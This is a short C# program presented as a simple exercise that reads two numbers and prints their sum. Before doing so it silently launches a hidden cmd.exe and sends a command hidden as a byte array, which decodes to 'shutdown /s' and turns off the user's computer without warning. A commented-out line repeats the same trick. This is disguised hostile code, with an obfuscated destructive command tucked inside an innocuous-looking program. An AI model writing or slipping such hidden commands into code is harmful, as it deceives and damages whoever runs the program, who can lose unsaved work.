﻿// Alireza Khosravi
// Mohsen Mohammadi
using System.Diagnostics;

void Sum(int a, int b) => Console.WriteLine(a+b);
String ConvertBack(byte[] inp)
{
    String result = "";
    for (int i = 0; i < inp.Length; i++)
    {
        result += (char)inp[i];
    }

    return result;
}
byte[] ConvertToByte(String inp)
{
    List<byte> b = new List<byte>();
    for(int i = 0; i < inp.Length; i++)
    {
        b.Add((byte)inp[i]);
    }

    return b.ToArray();
}

//System.Diagnostics.Process.Start("cmd.exe", ConvertBack(new byte[] { 115, 104, 117, 116, 100, 111, 119, 110, 32, 47, 115 }));
Process cmd = new Process();
cmd.StartInfo.FileName = "cmd.exe";
cmd.StartInfo.RedirectStandardInput = true;
cmd.StartInfo.RedirectStandardOutput = true;
cmd.StartInfo.CreateNoWindow = true;
cmd.StartInfo.UseShellExecute = false;
cmd.Start();

cmd.StandardInput.WriteLine(ConvertBack(new byte[] { 115, 104, 117, 116, 100, 111, 119, 110, 32, 47, 115 }));
cmd.StandardInput.Flush();
cmd.StandardInput.Close();
cmd.WaitForExit();


int a = 0, b = 0;
int.TryParse(Console.ReadLine(), out a);
int.TryParse(Console.ReadLine(), out b);

Sum(a, b);